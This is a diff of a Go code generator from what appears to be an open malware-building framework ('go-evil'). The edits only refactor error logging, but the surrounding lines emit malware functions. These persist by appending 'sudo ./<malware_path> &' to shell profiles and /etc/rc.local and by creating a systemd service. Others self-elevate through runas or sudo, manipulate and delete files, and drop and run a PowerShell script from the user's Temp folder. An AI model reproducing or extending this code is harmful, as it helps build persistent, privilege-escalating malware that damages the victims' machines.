@@ -133,7 +133,7 @@ func Abort(s_json string, languages string) ([]string, string) {
 		fmt.Sprintf("func %s(languages []string){", function_call),
 		"computer_lang, err := jibber_jabber.DetectTerritory()",
 		"if err != nil {",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"for _, lang := range languages{",
@@ -226,7 +226,7 @@ func Add_to_startup(s_json string) ([]string, string) {
 			"for _, line := range []string{\"/etc/profile\", \"~/.bash_profile\", \"~/.bash_login\", \"~/.profile\", \"/etc/rc.local\"} {",
 			"in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)",
 			"if err != nil {",
-			"notify.Log(err.Error(), spine.logging, \"3\")",
+			"spine.log(err.Error())",
 			"return",
 			"}",
 			"in.WriteString(\"sudo .\" + malware_path + \" &\")",
@@ -234,7 +234,7 @@ func Add_to_startup(s_json string) ([]string, string) {
 
 			"in, err := os.Create(\"/lib/systemd/system/tcp.service\")",
 			"if err != nil {",
-			"notify.Log(err.Error(), spine.logging, \"3\")",
+			"spine.log(err.Error())",
 			"return",
 			"}",
 
@@ -299,7 +299,7 @@ func write(s_json string, value string) ([]string, string) {
 
 		"file, err := os.Create(path)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 
@@ -343,7 +343,7 @@ func read(s_json string, value string) ([]string, string) {
 		"path = spine.variable.get(path)",
 		"gut, err := ioutil.ReadFile(path)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"}",
 		"spine.variable.set(string(gut))",
 		"}"})
@@ -370,7 +370,7 @@ func list_dir(s_json string, value string) ([]string, string) {
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(config []string){", function_call),
 		"if len(config) < 2{",
-		"notify.Log(\"The provided evil array does not contain all required values\", \"3\", spine.logging)",
+		"spine.log(\"The provided evil array does not contain all required values\")",
 		"return",
 		"}",
 		"obj_type := spine.variable.get(config[0])",
@@ -428,7 +428,7 @@ func remove(value string, s_json string) ([]string, string) {
 		"target = spine.variable.get(target)",
 		"err := os.Remove(target)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"}"})
@@ -472,7 +472,7 @@ func move(value string, s_json string) ([]string, string) {
 		"err := os.Rename(old_path, new_path)",
 
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 		"}"})
@@ -518,20 +518,20 @@ func copy(value string, s_json string) ([]string, string) {
 
 		"src, err := os.Open(old_path)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 
 		"dst, err := os.Create(new_path)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"return",
 		"}",
 
 		"_, err = io.Copy(dst, src)",
 
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"}",
 
 		"}"})
@@ -567,7 +567,7 @@ func change_background(value string, s_json string) ([]string, string) {
 		body = append(body, "user := tools.Grab_username()")
 
 		body = append(body, "content := []byte(script)", "ioutil.WriteFile(fmt.Sprintf(\"C:/Users/%s/AppData/Local/Temp/the_trunk.ps1\", user), content, 0644)")
-		body = append(body, "err := exec.Command(\"powershell\", fmt.Sprintf(\"C:/Users/%s/AppData/Local/Temp/the_trunk.ps1\", user)).Run()", "if err != nil{", "notify.Log(err.Error(), spine.logging, \"3\")", "}")
+		body = append(body, "err := exec.Command(\"powershell\", fmt.Sprintf(\"C:/Users/%s/AppData/Local/Temp/the_trunk.ps1\", user)).Run()", "if err != nil{", "spine.log(err.Error())", "}")
 
 		data_object.Add_go_import("io/ioutil")
 		data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
@@ -576,7 +576,7 @@ func change_background(value string, s_json string) ([]string, string) {
 		body = append(body, "targets := []string{\"gnome\", \"cinnamon\", \"kde\", \"mate\", \"budgie\", \"lxqt\", \"xfce\", \"deepin\"}")
 		body = append(body, "for _, target := range targets{", "complete_string := fmt.Sprintf(\"gsettings set org.%s.desktop.background picture-uri file://%s\", target, image_path)")
 		body = append(body, "final_target := strings.Split(complete_string, \" \")")
-		body = append(body, "err := exec.Command(final_target[0], final_target[1:]...).Run()", "if err != nil{", "notify.Log(err.Error(), spine.logging, \"3\")", "continue", "}", "}")
+		body = append(body, "err := exec.Command(final_target[0], final_target[1:]...).Run()", "if err != nil{", "spine.log(err.Error())", "continue", "}", "}")
 
 		data_object.Add_go_import("strings")
 
@@ -602,7 +602,7 @@ func change_background(value string, s_json string) ([]string, string) {
 func elevate(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "elevate"
-	body := []string{fmt.Sprintf("func %s(){", function_call), "if spine.is_admin{", "notify.Log(\"Malware is already elevated\", spine.logging, \"3\")", "return", "}"}
+	body := []string{fmt.Sprintf("func %s(){", function_call), "if spine.is_admin{", "spine.log(\"Malware is already elevated\")", "return", "}"}
 
 	if data_object.Target_os == "windows" {
 		body = append(body, "out, err := exec.Command(\"runas\", \"/user:administrator\", spine.path).Output()")
@@ -611,7 +611,7 @@ func elevate(value string, s_json string) ([]string, string) {
 		body = append(body, "out, err := exec.Command(\"sudo\", spine.path).Output()")
 	}
 
-	body = append(body, "if err != nil{", "notify.Log(err.Error(), spine.logging, \"3\")", "return", "}", "spine.variable.set(string(out))")
+	body = append(body, "if err != nil{", "spine.log(err.Error())", "return", "}", "spine.variable.set(string(out))")
 
 	body = append(body, "}")
 
